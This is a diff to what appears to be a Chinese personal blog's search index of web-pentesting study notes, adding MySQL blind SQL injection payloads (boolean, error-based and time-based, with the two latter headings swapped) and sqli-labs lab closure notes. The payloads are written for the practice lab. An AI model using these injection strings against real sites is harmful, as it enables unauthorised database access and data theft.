@@ -441,6 +441,46 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 正确</span><br><span class="line">id=1&#x27; 错误</span><br><span class="line">id=1&#x27;--+ 视报错情况而定</span><br></pre></td></tr></table></figure>
 
 <p>猜测参数闭合方式,然后采用闭合方式的后半部分将语句闭合，直到页面回显正常</p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>数据不能回显到前端页面</p>
+<h3 id="•基于布尔-SQL-盲注"><a href="#•基于布尔-SQL-盲注" class="headerlink" title="•基于布尔 SQL 盲注"></a>•基于布尔 SQL 盲注</h3><p>▲<strong>left(database(),1)&gt;’s’ //left()函数 Explain:database()显示数据库名称</strong>，</p>
+<p>left(a,b)从左侧截取 a 的前 b 位 </p>
+<p>▲<strong>ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 –+</strong> </p>
+<p>//substr()函数，ascii()函数 Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换 为 ascii 值 </p>
+<p>▲<strong>ascii(substr((select database()),1,1))=98</strong> </p>
+<p>▲<strong>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</strong></p>
+<p> //ORD()函数，MID()函数 Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值 </p>
+<p>▲<strong>regexp 正则注入</strong> 正则注入介绍：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a> </p>
+<p><strong>用法介绍</strong>：<strong>select user() regexp ‘^[a-z]’;</strong> </p>
+<p>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。 第二位可以用 select user() regexp ‘^ro’来进行。 Mysql 注入—sqlilabs—lcamry 19 当正确的时候显示结果为 1，不正确的时候显示结果为 0. </p>
+<p><strong>示例介绍：</strong> </p>
+<p>select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0)); </p>
+<p>select * from users where id=1 and 1=(user() regexp’^ri’); 通过 if 语句的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等 于 0 或者 1 进行判断。</p>
+<p> select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1); 这里利用 select 构造了一个判断语句。我们只需要更换 regexp 表达式即可 ‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE </p>
+<p>如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在 无法判断的情况下，可以用 table_name regexp ‘^username$’来进行判断。^是从开头进行 匹配，$是从结尾开始判断。更多的语法可以参考 mysql 使用手册进行了解。 </p>
+<p>好，这里思考一个问题？ table_name 有好几个，我们只得到了一个 user，如何知道其 他的？</p>
+<p> 这里可能会有人认为使用 limit 0，1 改为 limit 1,1。</p>
+<p> 但是这种做法是错误的，limit 作用在前面的 select 语句中，而不是 regexp。那我们该如 何选择。其实在 regexp 中我们是取匹配 table_name 中的内容，只要 table_name 中有的内 容，我们用 regexp 都能够匹配到。因此上述语句不仅仅可以选择 user，还可以匹配其他项。 </p>
+<p>▲like 匹配注入 和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。 </p>
+<p>用法：select user() like ‘ro%’</p>
+<h3 id="•基于时间的-SQL-盲注"><a href="#•基于时间的-SQL-盲注" class="headerlink" title="•基于时间的 SQL 盲注"></a>•基于时间的 SQL 盲注</h3><p>▲*<em>Select 1,count(</em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)<em>2)) a from information_schema.columns group by a;</em>* </p>
+<p>//explain:此处有三个点，一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的 重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时 重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 rand(0)，rand()需 要多试几次才行。</p>
+<p> 以上语句可以简化成如下的形式。</p>
+<p> select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2)) </p>
+<p>如果关键的表被禁用了，可以使用这种形式 </p>
+<p>select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2)) </p>
+<p>如果 rand 被禁用了可以使用用户变量来报错 </p>
+<p>select min(@a:=1) from information_schema.tables group by concat(passwo rd,@a:=(@a+1)%2)</p>
+<p>▲<strong>select exp(~(select * FROM(SELECT USER())a))</strong> </p>
+<p>//double 数值类 型超出范围 //Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上 可以参考 exp 报错文章：<a href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a> </p>
+<p>▲<strong>select !(select * from (select user())x) -（ps:这是减号） ~0</strong> //bigint 超出范围；~0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上 Mysql 注入—sqlilabs—lcamry 21 可以参考文章 bigint 溢出文章 <a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a> </p>
+<p>▲<strong>extractvalue(1,concat(0x7e,(select @@version),0x7e)) se</strong></p>
+<p>//mysql 对 xml 数据进 行查询和修改的 xpath 函数，xpath 语法错误 </p>
+<p>▲<strong>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</strong> //mysql 对 xml 数据进行 查询和修改的 xpath 函数，xpath 语法错误 </p>
+<p>▲<strong>select * from (select</strong> <strong>NAME_CONST(version(),1),NAME_CONST(version(),1))x;</strong> //mysql 重复特性，此处重复了 version，所以报错</p>
+<h3 id="•基于报错的-SQL-盲注"><a href="#•基于报错的-SQL-盲注" class="headerlink" title="•基于报错的 SQL 盲注"></a>•基于报错的 SQL 盲注</h3><p>▲<strong>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</strong> </p>
+<p>//if 判断语句，条件为假， 执行 sleep Ps：遇到以下这种利用 sleep()延时注入语句 select sleep(find_in_set(mid(@@version, 1, 1), ‘0,1,2,3,4,5,6,7,8, 9,.’)); 该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可 取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。 </p>
+<p>▲<strong>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</strong> </p>
+<p>//BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达 式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执 行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep() 函数进行注入</p>
 <h2 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^1=0 0^0=0 0^1=1`</span><br><span class="line">`1^1^1=0 1^1^0=0`</span><br><span class="line">构造payload:`&#x27;^ascii(mid(database(),1,1)=98)^0</span><br></pre></td></tr></table></figure>
 
 <p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
@@ -982,6 +1022,19 @@
 <p>是指正式提供对外服务的，一般会关掉错误报告，打开错误日志。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a)虚拟机软件直接安装在计算机硬件上</span><br><span class="line">b)虚拟机本身就是一个操作系统</span><br><span class="line">c)在这个虚拟机可以同时进行多个操作系统</span><br></pre></td></tr></table></figure>
 
+<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a>web安全</h1><h2 id="HTTP协议解析"><a href="#HTTP协议解析" class="headerlink" title="HTTP协议解析"></a>HTTP协议解析</h2><h3 id="1-发起HTTP请求"><a href="#1-发起HTTP请求" class="headerlink" title="1.发起HTTP请求"></a>1.发起HTTP请求</h3><p>Linux系统:利用curl命令</p>
+<p>windows系统:利用curl.exe 工具发起请求，通过curl +URL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://www.baidu.com  返回HTML</span><br><span class="line">curl http://www.baidu.com -1 返回http响应头</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-HTTP详解"><a href="#2-HTTP详解" class="headerlink" title="2.HTTP详解"></a>2.HTTP详解</h3><p>见网上</p>
+<h3 id="3-HTTP请求方法"><a href="#3-HTTP请求方法" class="headerlink" title="3.HTTP请求方法"></a>3.HTTP请求方法</h3><p>GET 有大小长度限制，将发送的数据显示在浏览器端</p>
+<p>HEAD  </p>
+<p>POST</p>
+<p>PUT </p>
+<p>DELETE</p>
+<p>TRACE</p>
+<p>CONNECT</p>
+<p>OPTIONS</p>
 ]]></content>
       <categories>
         <category>wen渗透</category>
@@ -1013,6 +1066,8 @@
 
 <h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><p> near ‘’1’’) LIMIT 0,1’ at line 1</p>
 <p>‘1’’) LIMIT 0,1   ‘1’) LIMIT 0,1 因此猜测闭合语句为（’ ‘）</p>
+<h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><p> near ‘“1””) LIMIT 0,1’ at line 1</p>
+<p>“1””) LIMIT 0,1   因此猜测语句为（“ ”）</p>
 ]]></content>
       <categories>
         <category>sqli-labs通关记录</category>
